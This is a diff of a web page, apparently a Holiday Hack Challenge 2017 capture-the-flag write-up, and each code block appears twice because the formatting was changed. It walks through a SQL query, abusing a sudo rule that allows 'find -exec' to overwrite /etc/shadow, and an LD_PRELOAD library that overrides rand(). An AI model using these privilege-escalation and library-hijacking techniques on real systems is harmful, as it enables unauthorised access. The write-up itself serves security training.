-</div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">sqlite&gt; </span><span style="color:#66d9ef">select</span><span style=""> * from songs where </span><span style="">id</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#ae81ff">392</span><span style="">;</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">392</span><span style="">|</span><span style="">Stairway to Heaven</span><span style="">|</span><span style="">Led Zeppelin</span><span style="">|</span><span style="color:#ae81ff">1971</span><span style="">|</span><span style="color:#e6db74">&#34;Stairway to Heaven&#34;</span><span style=""> is a song by the English rock band Led Zeppelin, released in late </span><span style="color:#ae81ff">1971</span><span style="">. It was composed by guitarist Jimmy Page and vocalist Robert Plant </span><span style="color:#66d9ef">for</span><span style=""> the band</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="">s untitled fourth studio album </span><span style="color:#f92672">(</span><span style="">often called Led Zeppelin IV</span><span style="color:#f92672">)</span><span style="">. It is often referred to as one of the greatest rock songs of all time.
-</span><span style="">
-</span><span style="">sqlite&gt; .shell ./runtoanswer 
-</span><span style="">Starting up, please wait......
-</span><span style="">Enter the name of the song with the most likes: Stairway to Heaven
-</span><span style="">That is the #1 Christmas song, congratulations!</span></code></pre>
-</div>
+
+<pre><code class="language-sql">select count(songid) count, songid from likes group by songid order by count desc limit 10;
+</code></pre>
+
+<pre><code class="language-bash">sqlite&gt; select count(songid) count, songid from likes group by songid order by count desc limit 10;
+11325|392
+2162|245
+2140|265
+2132|207
+2129|98
+2126|90
+2122|33
+2120|130
+2117|18
+2117|446
+</code></pre>
+
+<pre><code class="language-bash">sqlite&gt; select * from songs where id = 392;
+392|Stairway to Heaven|Led Zeppelin|1971|&quot;Stairway to Heaven&quot; is a song by the English rock band Led Zeppelin, released in late 1971. It was composed by guitarist Jimmy Page and vocalist Robert Plant for the band's untitled fourth studio album (often called Led Zeppelin IV). It is often referred to as one of the greatest rock songs of all time.
+
+sqlite&gt; .shell ./runtoanswer 
+Starting up, please wait......
+Enter the name of the song with the most likes: Stairway to Heaven
+That is the #1 Christmas song, congratulations!
+</code></pre>
+
 <h2 id="oh-wait-maybe-we-are">OH WAIT! MAYBE WE ARE&hellip;</h2>
 
 <h3 id="shadow-file-restoration">Shadow File Restoration</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">              </span><span style="color:#ae81ff">\ </span><span style="">/
-</span><span style="">            --&gt;*&lt;--
-</span><span style="">              /o</span><span style="color:#ae81ff">\
-</span><span style="color:#ae81ff"></span><span style="">             /_</span><span style="color:#ae81ff">\_\
-</span><span style="color:#ae81ff"></span><span style="">            /_/_0_</span><span style="color:#ae81ff">\
-</span><span style="color:#ae81ff"></span><span style="">           /_o_</span><span style="color:#ae81ff">\_\_\
-</span><span style="color:#ae81ff"></span><span style="">          /_/_/_/_/o</span><span style="color:#ae81ff">\
-</span><span style="color:#ae81ff"></span><span style="">         /@</span><span style="color:#ae81ff">\_\_\@\_\_\
-</span><span style="color:#ae81ff"></span><span style="">        /_/_/O/_/_/_/_</span><span style="color:#ae81ff">\
-</span><span style="color:#ae81ff"></span><span style="">       /_</span><span style="color:#ae81ff">\_\_\_\_\o\_\_\
-</span><span style="color:#ae81ff"></span><span style="">      /_/0/_/_/_0_/_/@/_</span><span style="color:#ae81ff">\
-</span><span style="color:#ae81ff"></span><span style="">     /_</span><span style="color:#ae81ff">\_\_\_\_\_\_\_\_\_\
-</span><span style="color:#ae81ff"></span><span style="">    /_/o/_/_/@/_/_/o/_/0/_</span><span style="color:#ae81ff">\
-</span><span style="color:#ae81ff"></span><span style="">   jgs       </span><span style="color:#f92672">[</span><span style="">___</span><span style="color:#f92672">]</span><span style="">  
-</span><span style="">My name is Shinny Upatree, and I</span><span style="color:#e6db74">&#39;ve made a big mistake.
-</span><span style="color:#e6db74">I fear it&#39;</span><span style="">s worse than the </span><span style="">time</span><span style=""> I served everyone bad hake.
-</span><span style="">I</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="">ve deleted an important file, which suppressed my server access.
-</span><span style="">I can offer you a gift, </span><span style="color:#66d9ef">if</span><span style=""> you can fix my ill-fated redress.
-</span><span style="">Restore /etc/shadow with the contents of /etc/shadow.bak, </span><span style="color:#66d9ef">then</span><span style=""> run </span><span style="color:#e6db74">&#34;inspect_da_b
-</span><span style="color:#e6db74">ox&#34;</span><span style=""> to </span><span style="">complete</span><span style=""> this challenge.
-</span><span style="">Hint: What commands can you run with sudo?</span></code></pre>
-</div>
+
+<pre><code class="language-bash">              \ /
+            --&gt;*&lt;--
+              /o\
+             /_\_\
+            /_/_0_\
+           /_o_\_\_\
+          /_/_/_/_/o\
+         /@\_\_\@\_\_\
+        /_/_/O/_/_/_/_\
+       /_\_\_\_\_\o\_\_\
+      /_/0/_/_/_0_/_/@/_\
+     /_\_\_\_\_\_\_\_\_\_\
+    /_/o/_/_/@/_/_/o/_/0/_\
+   jgs       [___]  
+My name is Shinny Upatree, and I've made a big mistake.
+I fear it's worse than the time I served everyone bad hake.
+I've deleted an important file, which suppressed my server access.
+I can offer you a gift, if you can fix my ill-fated redress.
+Restore /etc/shadow with the contents of /etc/shadow.bak, then run &quot;inspect_da_b
+ox&quot; to complete this challenge.
+Hint: What commands can you run with sudo?
+</code></pre>
+
 <p>Let&rsquo;s see what commands can be run with sudo</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@e4490931c153:~$ sudo -ll
-</span><span style="">Matching Defaults entries </span><span style="color:#66d9ef">for</span><span style=""> elf on e4490931c153:
-</span><span style="">    env_reset, mail_badpass, </span><span style="">secure_path</span><span style=""></span><span style="color:#f92672">=</span><span style="">/usr/local/sbin</span><span style="color:#ae81ff">\:</span><span style="">/usr/local/bin</span><span style="color:#ae81ff">\:</span><span style="">/usr/sbin</span><span style="color:#ae81ff">\:</span><span style="">/usr/bin</span><span style="color:#ae81ff">\:</span><span style="">/sbin</span><span style="color:#ae81ff">\:</span><span style="">/bin</span><span style="color:#ae81ff">\:</span><span style="">/snap/bin
-</span><span style="">User elf may run the following commands on e4490931c153:
-</span><span style="">Sudoers entry:
-</span><span style="">    RunAsUsers: elf
-</span><span style="">    RunAsGroups: shadow
-</span><span style="">    Options: !authenticate
-</span><span style="">    Commands:
-</span><span style="">        /usr/bin/find</span></code></pre>
-</div>
+
+<pre><code class="language-bash">elf@e4490931c153:~$ sudo -ll
+Matching Defaults entries for elf on e4490931c153:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+User elf may run the following commands on e4490931c153:
+Sudoers entry:
+    RunAsUsers: elf
+    RunAsGroups: shadow
+    Options: !authenticate
+    Commands:
+        /usr/bin/find
+</code></pre>
+
 <p>Have been tinkering with <code>find</code> for a while, I know it can execute commands on the results using the <code>-exec</code> flag, but I wasn&rsquo;t sure with what privileges it will execute the commands. These are the shadow files in <code>/etc</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@72830e537580:~$ ls -la /etc/shadow*
-</span><span style="">-rw-rw---- </span><span style="color:#ae81ff">1</span><span style=""> root shadow   </span><span style="color:#ae81ff">0</span><span style=""> Dec </span><span style="color:#ae81ff">15</span><span style=""> </span><span style="color:#ae81ff">20</span><span style="">:00 /etc/shadow
-</span><span style="">-rw------- </span><span style="color:#ae81ff">1</span><span style=""> root root   </span><span style="color:#ae81ff">652</span><span style=""> Nov </span><span style="color:#ae81ff">14</span><span style=""> </span><span style="color:#ae81ff">13</span><span style="">:48 /etc/shadow-
-</span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> root root   </span><span style="color:#ae81ff">677</span><span style=""> Dec </span><span style="color:#ae81ff">15</span><span style=""> </span><span style="color:#ae81ff">19</span><span style="">:59 /etc/shadow.bak</span></code></pre>
-</div>
+
+<pre><code class="language-bash">elf@72830e537580:~$ ls -la /etc/shadow*
+-rw-rw---- 1 root shadow   0 Dec 15 20:00 /etc/shadow
+-rw------- 1 root root   652 Nov 14 13:48 /etc/shadow-
+-rw-r--r-- 1 root root   677 Dec 15 19:59 /etc/shadow.bak
+</code></pre>
+
 <p>The file we need to restore belongs to the <code>shadow</code> group and it has read+write group permission. My solution is to let <code>find</code> find this file (no pun intended) and then copy the backup shadow file over it.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@72830e537580:~$ sudo -g shadow find /etc/shadow -exec cp /etc/shadow.bak </span><span style="color:#f92672">{}</span><span style=""> </span><span style="color:#ae81ff">\;</span><span style="">
-</span><span style="">elf@72830e537580:~$ ls -la /etc/shadow*
-</span><span style="">-rw-rw---- </span><span style="color:#ae81ff">1</span><span style=""> root shadow </span><span style="color:#ae81ff">677</span><span style=""> Jan  </span><span style="color:#ae81ff">6</span><span style=""> </span><span style="color:#ae81ff">10</span><span style="">:23 /etc/shadow
-</span><span style="">-rw------- </span><span style="color:#ae81ff">1</span><span style=""> root root   </span><span style="color:#ae81ff">652</span><span style=""> Nov </span><span style="color:#ae81ff">14</span><span style=""> </span><span style="color:#ae81ff">13</span><span style="">:48 /etc/shadow-
-</span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> root root   </span><span style="color:#ae81ff">677</span><span style=""> Dec </span><span style="color:#ae81ff">15</span><span style=""> </span><span style="color:#ae81ff">19</span><span style="">:59 /etc/shadow.bak
-</span><span style="">elf@72830e537580:~$ inspect_da_box 
-</span><span style="">                     ___
-</span><span style="">                    / __</span><span style="color:#e6db74">&#39;.     .-&#34;&#34;&#34;-.
-</span><span style="color:#e6db74">              .-&#34;&#34;-| |  &#39;</span><span style="">.</span><span style="color:#e6db74">&#39;.  / .---. \
-</span><span style="color:#e6db74">             / .--. \ \___\ \/ /____| |
-</span><span style="color:#e6db74">            / /    \ `-.-;-(`_)_____.-&#39;</span><span style="">._
-</span><span style="">           </span><span style="">;</span><span style=""> </span><span style="">;</span><span style="">      </span><span style="color:#e6db74">`</span><span style="">.-</span><span style="color:#e6db74">&#34; &#34;</span><span style="">-:_,</span><span style="color:#f92672">(</span><span style="">o:</span><span style="color:#f92672">==</span><span style="">..</span><span style="color:#e6db74">`</span><span style="">-. </span><span style="color:#e6db74">&#39;.         .-&#34;-,
-</span><span style="color:#e6db74">           | |      /       \ /      `\ `. \       / .-. \
-</span><span style="color:#e6db74">           \ \     |         Y    __...\  \ \     / /   \/
-</span><span style="color:#e6db74">     /\     | |    | .--&#34;&#34;--.| .-&#39;</span><span style="">      </span><span style="color:#ae81ff">\ </span><span style=""> </span><span style="color:#e6db74">&#39;.`---&#39;</span><span style=""> /
-</span><span style="">     </span><span style="color:#ae81ff">\ \ </span><span style="">  / /     </span><span style="">|</span><span style="color:#e6db74">`</span><span style="">        </span><span style="color:#ae81ff">\&#39;</span><span style="">   _...--.</span><span style="">;</span><span style="">   </span><span style="color:#e6db74">&#39;---&#39;</span><span style="color:#e6db74">`</span><span style="">
-</span><span style="">      </span><span style="color:#ae81ff">\ </span><span style="color:#e6db74">&#39;-&#39;</span><span style=""> / jgs  /_..---.._ </span><span style="color:#ae81ff">\ </span><span style="">.</span><span style="color:#e6db74">&#39;\\_     `.
-</span><span style="color:#e6db74">       `--&#39;</span><span style="color:#e6db74">`</span><span style="">      .</span><span style="color:#e6db74">&#39;    (_)  `&#39;</span><span style="">/   </span><span style="color:#f92672">(</span><span style="">_</span><span style="color:#f92672">)</span><span style="">     /
-</span><span style="">                  </span><span style="color:#e6db74">`</span><span style="">._       _.</span><span style="color:#e6db74">&#39;|         .&#39;</span><span style="">
-</span><span style="">                     </span><span style="color:#e6db74">```````</span><span style="">    </span><span style="color:#e6db74">&#39;-...--&#39;</span><span style="color:#e6db74">`</span><span style="">
-</span><span style="">/etc/shadow has been successfully restored!</span></code></pre>
-</div>
+
+<pre><code class="language-bash">elf@72830e537580:~$ sudo -g shadow find /etc/shadow -exec cp /etc/shadow.bak {} \;
+elf@72830e537580:~$ ls -la /etc/shadow*
+-rw-rw---- 1 root shadow 677 Jan  6 10:23 /etc/shadow
+-rw------- 1 root root   652 Nov 14 13:48 /etc/shadow-
+-rw-r--r-- 1 root root   677 Dec 15 19:59 /etc/shadow.bak
+elf@72830e537580:~$ inspect_da_box 
+                     ___
+                    / __'.     .-&quot;&quot;&quot;-.
+              .-&quot;&quot;-| |  '.'.  / .---. \
+             / .--. \ \___\ \/ /____| |
+            / /    \ `-.-;-(`_)_____.-'._
+           ; ;      `.-&quot; &quot;-:_,(o:==..`-. '.         .-&quot;-,
+           | |      /       \ /      `\ `. \       / .-. \
+           \ \     |         Y    __...\  \ \     / /   \/
+     /\     | |    | .--&quot;&quot;--.| .-'      \  '.`---' /
+     \ \   / /     |`        \'   _...--.;   '---'`
+      \ '-' / jgs  /_..---.._ \ .'\\_     `.
+       `--'`      .'    (_)  `'/   (_)     /
+                  `._       _.'|         .'
+                     ```````    '-...--'`
+/etc/shadow has been successfully restored!
+</code></pre>
+
 <h2 id="we-re-off-to-see-the">WE&rsquo;RE OFF TO SEE THE&hellip;</h2>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">                 .--._.--.--.__.--.--.__.--.--.__.--.--._.--.
-</span><span style="">               _</span><span style="color:#f92672">(</span><span style="">_      _Y_      _Y_      _Y_      _Y_      _</span><span style="color:#f92672">)</span><span style="">_
-</span><span style="">              </span><span style="color:#f92672">[</span><span style="">___</span><span style="color:#f92672">]</span><span style="">    </span><span style="color:#f92672">[</span><span style="">___</span><span style="color:#f92672">]</span><span style="">    </span><span style="color:#f92672">[</span><span style="">___</span><span style="color:#f92672">]</span><span style="">    </span><span style="color:#f92672">[</span><span style="">___</span><span style="color:#f92672">]</span><span style="">    </span><span style="color:#f92672">[</span><span style="">___</span><span style="color:#f92672">]</span><span style="">    </span><span style="color:#f92672">[</span><span style="">___</span><span style="color:#f92672">]</span><span style="">
-</span><span style="">              /:</span><span style="color:#e6db74">&#39; \    /:&#39;</span><span style=""> </span><span style="color:#ae81ff">\ </span><span style="">   /:</span><span style="color:#e6db74">&#39; \    /:&#39;</span><span style=""> </span><span style="color:#ae81ff">\ </span><span style="">   /:</span><span style="color:#e6db74">&#39; \    /:&#39;</span><span style=""> </span><span style="color:#ae81ff">\
-</span><span style="color:#ae81ff"></span><span style="">             </span><span style="">|</span><span style="">::   </span><span style="">|</span><span style="">  </span><span style="">|</span><span style="">::   </span><span style="">|</span><span style="">  </span><span style="">|</span><span style="">::   </span><span style="">|</span><span style="">  </span><span style="">|</span><span style="">::   </span><span style="">|</span><span style="">  </span><span style="">|</span><span style="">::   </span><span style="">|</span><span style="">  </span><span style="">|</span><span style="">::   </span><span style="">|</span><span style="">
-</span><span style="">             </span><span style="color:#ae81ff">\:</span><span style="">:.  /  </span><span style="color:#ae81ff">\:</span><span style="">:.  /  </span><span style="color:#ae81ff">\:</span><span style="">:.  /  </span><span style="color:#ae81ff">\:</span><span style="">:.  /  </span><span style="color:#ae81ff">\:</span><span style="">:.  /  </span><span style="color:#ae81ff">\:</span><span style="">:.  /
-</span><span style="">         jgs  </span><span style="color:#ae81ff">\:</span><span style="">:./    </span><span style="color:#ae81ff">\:</span><span style="">:./    </span><span style="color:#ae81ff">\:</span><span style="">:./    </span><span style="color:#ae81ff">\:</span><span style="">:./    </span><span style="color:#ae81ff">\:</span><span style="">:./    </span><span style="color:#ae81ff">\:</span><span style="">:./
-</span><span style="">               </span><span style="color:#e6db74">&#39;=&#39;</span><span style="">      </span><span style="color:#e6db74">&#39;=&#39;</span><span style="">      </span><span style="color:#e6db74">&#39;=&#39;</span><span style="">      </span><span style="color:#e6db74">&#39;=&#39;</span><span style="">      </span><span style="color:#e6db74">&#39;=&#39;</span><span style="">      </span><span style="color:#e6db74">&#39;=&#39;</span><span style="">
-</span><span style="">Wunorse Openslae has a special challenge </span><span style="color:#66d9ef">for</span><span style=""> you.
-</span><span style="">Run the given binary, make it </span><span style="color:#66d9ef">return</span><span style=""> </span><span style="color:#ae81ff">42</span><span style="">.
-</span><span style="">Use the partial </span><span style="">source</span><span style=""> </span><span style="color:#66d9ef">for</span><span style=""> hints, it is just a clue.
-</span><span style="">You will need to write your own code, but only a line or two.
-</span><span style="">total </span><span style="color:#ae81ff">88</span><span style="">
-</span><span style="">-rwxr-xr-x </span><span style="color:#ae81ff">1</span><span style=""> root root </span><span style="color:#ae81ff">84824</span><span style=""> Dec </span><span style="color:#ae81ff">16</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">:47 isit42
-</span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> root root   </span><span style="color:#ae81ff">654</span><span style=""> Dec </span><span style="color:#ae81ff">15</span><span style=""> </span><span style="color:#ae81ff">19</span><span style="">:59 isit42.c.un</span></code></pre>
-</div>
+
+<pre><code class="language-bash">
+                 .--._.--.--.__.--.--.__.--.--.__.--.--._.--.
+               _(_      _Y_      _Y_      _Y_      _Y_      _)_
+              [___]    [___]    [___]    [___]    [___]    [___]
+              /:' \    /:' \    /:' \    /:' \    /:' \    /:' \
+             |::   |  |::   |  |::   |  |::   |  |::   |  |::   |
+             \::.  /  \::.  /  \::.  /  \::.  /  \::.  /  \::.  /
+         jgs  \::./    \::./    \::./    \::./    \::./    \::./
+               '='      '='      '='      '='      '='      '='
+Wunorse Openslae has a special challenge for you.
+Run the given binary, make it return 42.
+Use the partial source for hints, it is just a clue.
+You will need to write your own code, but only a line or two.
+total 88
+-rwxr-xr-x 1 root root 84824 Dec 16 16:47 isit42
+-rw-r--r-- 1 root root   654 Dec 15 19:59 isit42.c.un
+</code></pre>
+
 <p>To produce the expected result when running the binary, we&rsquo;ll need to make a shared object and specify it in the <code>LD_PRELOAD</code> environment variable. In this shared object, we can rewrite the <code>rand()</code> function used in the binary <code>isit42</code> so that it always return 42.</p>
 
 <p><code>hijack.c</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span><span style=""> </span><span style="color:#a6e22e">rand</span><span style="">()</span><span style=""> </span><span style="">{</span><span style="">
-</span><span style="">        </span><span style="color:#66d9ef">return</span><span style=""> </span><span style="color:#ae81ff">42</span><span style="">;</span><span style="">
-</span><span style=""></span><span style="">}</span></code></pre>
-</div>
+
+<pre><code class="language-c">int rand() {
+        return 42;
+}
+</code></pre>
+
 <p>Compile the above code to a shared object:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">gcc -o libc.so.6 -shared -fPIC hijack.c</span></code></pre>
-</div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@419cb8f6de23:~$ </span><span style="">LD_PRELOAD</span><span style=""></span><span style="color:#f92672">=</span><span style="">./libc.so.6 ./isit42 
-</span><span style="">Starting up ... </span><span style="color:#66d9ef">done</span><span style="">.
-</span><span style="">Calling rand</span><span style="color:#f92672">()</span><span style=""> to </span><span style="color:#66d9ef">select</span><span style=""> a random number.
-</span><span style="">                 .-. 
-</span><span style="">                .</span><span style="">;;</span><span style="color:#ae81ff">\ </span><span style="color:#f92672">||</span><span style="">           _______  __   __  _______    _______  __    _  _______  _     _  _______  ______ 
-</span><span style="">               /::::</span><span style="color:#ae81ff">\|</span><span style="">/          </span><span style="">|</span><span style="">       </span><span style="color:#f92672">||</span><span style="">  </span><span style="">|</span><span style=""> </span><span style="">|</span><span style="">  </span><span style="color:#f92672">||</span><span style="">       </span><span style="">|</span><span style="">  </span><span style="">|</span><span style="">   _   </span><span style="color:#f92672">||</span><span style="">  </span><span style="">|</span><span style="">  </span><span style="">|</span><span style=""> </span><span style="color:#f92672">||</span><span style="">       </span><span style="color:#f92672">||</span><span style=""> </span><span style="">|</span><span style=""> _ </span><span style="">|</span><span style=""> </span><span style="color:#f92672">||</span><span style="">       </span><span style="color:#f92672">||</span><span style="">    _ </span><span style="">|</span><span style="">
-</span><span style="">              /::::</span><span style="color:#e6db74">&#39;();          |_     _||  |_|  ||    ___|  |  |_|  ||   |_| ||  _____|| || || ||    ___||   | ||
-</span><span style="color:#e6db74">            |\/`\:_/`\/|           |   |  |       ||   |___   |       ||       || |_____ |       ||   |___ |   |_||_ 
-</span><span style="color:#e6db74">        ,__ |0_..().._0| __,       |   |  |       ||    ___|  |       ||  _    ||_____  ||       ||    ___||    __  |
-</span><span style="color:#e6db74">         \,`////&#34;&#34;&#34;&#34;\\\\`,/        |   |  |   _   ||   |___   |   _   || | |   | _____| ||   _   ||   |___ |   |  | |
-</span><span style="color:#e6db74">         | )//_ o  o _\\( |        |___|  |__| |__||_______|  |__| |__||_|  |__||_______||__| |__||_______||___|  |_|
-</span><span style="color:#e6db74">          \/|(_) () (_)|\/ 
-</span><span style="color:#e6db74">            \   &#39;</span><span style="color:#f92672">()</span><span style="color:#e6db74">&#39;   /            ______    _______  _______  ___      ___      __   __    ___   _______ 
-</span><span style="color:#e6db74">            _:.______.;_           |    _ |  |       ||   _   ||   |    |   |    |  | |  |  |   | |       |
-</span><span style="color:#e6db74">          /| | /`\/`\ | |\         |   | ||  |    ___||  |_|  ||   |    |   |    |  |_|  |  |   | |  _____|
-</span><span style="color:#e6db74">         / | | \_/\_/ | | \        |   |_||_ |   |___ |       ||   |    |   |    |       |  |   | | |_____ 
-</span><span style="color:#e6db74">        /  |o`&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;`o|  \       |    __  ||    ___||       ||   |___ |   |___ |_     _|  |   | |_____  |
-</span><span style="color:#e6db74">       `.__/     ()     \__.&#39;</span><span style="">      </span><span style="">|</span><span style="">   </span><span style="">|</span><span style="">  </span><span style="">|</span><span style=""> </span><span style="color:#f92672">||</span><span style="">   </span><span style="">|</span><span style="">___ </span><span style="">|</span><span style="">   _   </span><span style="color:#f92672">||</span><span style="">       </span><span style="color:#f92672">||</span><span style="">       </span><span style="">|</span><span style="">  </span><span style="">|</span><span style="">   </span><span style="">|</span><span style="">    </span><span style="">|</span><span style="">   </span><span style="">|</span><span style="">  _____</span><span style="">|</span><span style=""> </span><span style="">|</span><span style="">
-</span><span style="">       </span><span style="">|</span><span style="">  </span><span style="">|</span><span style=""> ___      ___ </span><span style="">|</span><span style="">  </span><span style="">|</span><span style="">      </span><span style="">|</span><span style="">___</span><span style="">|</span><span style="">  </span><span style="">|</span><span style="">_</span><span style="color:#f92672">||</span><span style="">_______</span><span style="color:#f92672">||</span><span style="">__</span><span style="">|</span><span style=""> </span><span style="">|</span><span style="">__</span><span style="color:#f92672">||</span><span style="">_______</span><span style="color:#f92672">||</span><span style="">_______</span><span style="">|</span><span style="">  </span><span style="">|</span><span style="">___</span><span style="">|</span><span style="">    </span><span style="">|</span><span style="">___</span><span style="">|</span><span style=""> </span><span style="">|</span><span style="">_______</span><span style="">|</span><span style="">
-</span><span style="">       /  </span><span style="color:#ae81ff">\|</span><span style="">---</span><span style="">|</span><span style="">    </span><span style="">|</span><span style="">---</span><span style="">|</span><span style="">/  </span><span style="color:#ae81ff">\ </span><span style="">
-</span><span style="">       </span><span style="">|</span><span style="">  </span><span style="color:#f92672">(</span><span style="">|</span><span style="color:#ae81ff">42</span><span style=""> </span><span style="">|</span><span style=""> </span><span style="color:#f92672">()</span><span style=""> </span><span style="">|</span><span style=""> DA</span><span style="">|</span><span style="color:#f92672">)</span><span style="">  </span><span style="">|</span><span style="">       _   ___  _______ 
-</span><span style="">       </span><span style="color:#ae81ff">\ </span><span style=""> /</span><span style="">;</span><span style="">---</span><span style="color:#e6db74">&#39;    &#39;</span><span style="">---</span><span style="">;</span><span style="color:#ae81ff">\ </span><span style=""> /      </span><span style="">|</span><span style=""> </span><span style="">|</span><span style=""> </span><span style="">|</span><span style="">   </span><span style="color:#f92672">||</span><span style="">       </span><span style="">|</span><span style="">
-</span><span style="">        </span><span style="color:#e6db74">``</span><span style=""> </span><span style="color:#ae81ff">\ </span><span style="">___ /</span><span style="color:#ae81ff">\ </span><span style="">___ / </span><span style="color:#e6db74">``</span><span style="">       </span><span style="">|</span><span style=""> </span><span style="">|</span><span style="">_</span><span style="">|</span><span style="">   </span><span style="color:#f92672">||</span><span style="">____   </span><span style="">|</span><span style="">
-</span><span style="">            </span><span style="color:#e6db74">`</span><span style="">|</span><span style="">  </span><span style="">|</span><span style="">  </span><span style="">|</span><span style="">  </span><span style="">|</span><span style="color:#e6db74">`</span><span style="">           </span><span style="">|</span><span style="">       </span><span style="">|</span><span style=""> ____</span><span style="">|</span><span style="">  </span><span style="">|</span><span style="">
-</span><span style="">      jgs    </span><span style="">|</span><span style="">  </span><span style="">|</span><span style="">  </span><span style="">|</span><span style="">  </span><span style="">|</span><span style="">            </span><span style="">|</span><span style="">___    </span><span style="color:#f92672">||</span><span style=""> ______</span><span style="">|</span><span style=""> ___ 
-</span><span style="">       _._  </span><span style="">|</span><span style="color:#ae81ff">\|\/</span><span style="color:#f92672">||</span><span style="color:#ae81ff">\/</span><span style="">|</span><span style="">/</span><span style="">|</span><span style="">  _._          </span><span style="">|</span><span style="">   </span><span style="color:#f92672">||</span><span style=""> </span><span style="">|</span><span style="">_____ </span><span style="">|</span><span style="">   </span><span style="">|</span><span style="">
-</span><span style="">      / .-</span><span style="color:#ae81ff">\ </span><span style="">|</span><span style="">~~~~</span><span style="color:#f92672">||</span><span style="">~~~~</span><span style="">|</span><span style=""> /-. </span><span style="color:#ae81ff">\ </span><span style="">        </span><span style="">|</span><span style="">___</span><span style="color:#f92672">||</span><span style="">_______</span><span style="color:#f92672">||</span><span style="">___</span><span style="">|</span><span style="">
-</span><span style="">      </span><span style="">|</span><span style=""> </span><span style="color:#ae81ff">\_</span><span style="">_.</span><span style="color:#e6db74">&#39;    ||    &#39;</span><span style="">.__/ </span><span style="">|</span><span style="">
-</span><span style="">       </span><span style="color:#e6db74">`</span><span style="">---------</span><span style="color:#e6db74">&#39;&#39;</span><span style="">---------</span><span style="color:#e6db74">`</span><span style=""> 
-</span><span style="">Congratulations! You</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="">ve won, and have successfully completed this challenge.</span></code></pre>
-</div>
+
+<pre><code class="language-bash">gcc -o libc.so.6 -shared -fPIC hijack.c
+</code></pre>
+
+<pre><code class="language-bash">elf@419cb8f6de23:~$ LD_PRELOAD=./libc.so.6 ./isit42 
+Starting up ... done.
+Calling rand() to select a random number.
+                 .-. 
+                .;;\ ||           _______  __   __  _______    _______  __    _  _______  _     _  _______  ______ 
+               /::::\|/          |       ||  | |  ||       |  |   _   ||  |  | ||       || | _ | ||       ||    _ |
+              /::::'();          |_     _||  |_|  ||    ___|  |  |_|  ||   |_| ||  _____|| || || ||    ___||   | ||
+            |\/`\:_/`\/|           |   |  |       ||   |___   |       ||       || |_____ |       ||   |___ |   |_||_ 
+        ,__ |0_..().._0| __,       |   |  |       ||    ___|  |       ||  _    ||_____  ||       ||    ___||    __  |
+         \,`////&quot;&quot;&quot;&quot;\\\\`,/        |   |  |   _   ||   |___   |   _   || | |   | _____| ||   _   ||   |___ |   |  | |
+         | )//_ o  o _\\( |        |___|  |__| |__||_______|  |__| |__||_|  |__||_______||__| |__||_______||___|  |_|
+          \/|(_) () (_)|\/ 
+            \   '()'   /            ______    _______  _______  ___      ___      __   __    ___   _______ 
+            _:.______.;_           |    _ |  |       ||   _   ||   |    |   |    |  | |  |  |   | |       |
+          /| | /`\/`\ | |\         |   | ||  |    ___||  |_|  ||   |    |   |    |  |_|  |  |   | |  _____|
+         / | | \_/\_/ | | \        |   |_||_ |   |___ |       ||   |    |   |    |       |  |   | | |_____ 
+        /  |o`&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;`o|  \       |    __  ||    ___||       ||   |___ |   |___ |_     _|  |   | |_____  |
+       `.__/     ()     \__.'      |   |  | ||   |___ |   _   ||       ||       |  |   |    |   |  _____| |
+       |  | ___      ___ |  |      |___|  |_||_______||__| |__||_______||_______|  |___|    |___| |_______|
+       /  \|---|    |---|/  \ 
+       |  (|42 | () | DA|)  |       _   ___  _______ 
+       \  /;---'    '---;\  /      | | |   ||       |
+        `` \ ___ /\ ___ / ``       | |_|   ||____   |
+            `|  |  |  |`           |       | ____|  |
+      jgs    |  |  |  |            |___    || ______| ___ 
+       _._  |\|\/||\/|/|  _._          |   || |_____ |   |
+      / .-\ |~~~~||~~~~| /-. \         |___||_______||___|
+      | \__.'    ||    '.__/ |
+       `---------''---------` 
+Congratulations! You've won, and have successfully completed this challenge.
+</code></pre>
+
 <p><a name="HHC17-GreatBook"></a></p>
 
 <h1 id="finding-pages-of-the-great-book">Finding Pages of the Great Book</h1>
@@ -573,13 +774,17 @@ This is a 64-bit machine, so we need to find the linker at <code>/lib64/ld-linux
 </ul>
 
 <p>Visit the Lettes to Santa application and read the source code, I encountered an interesting hidden field   on line 243</p>
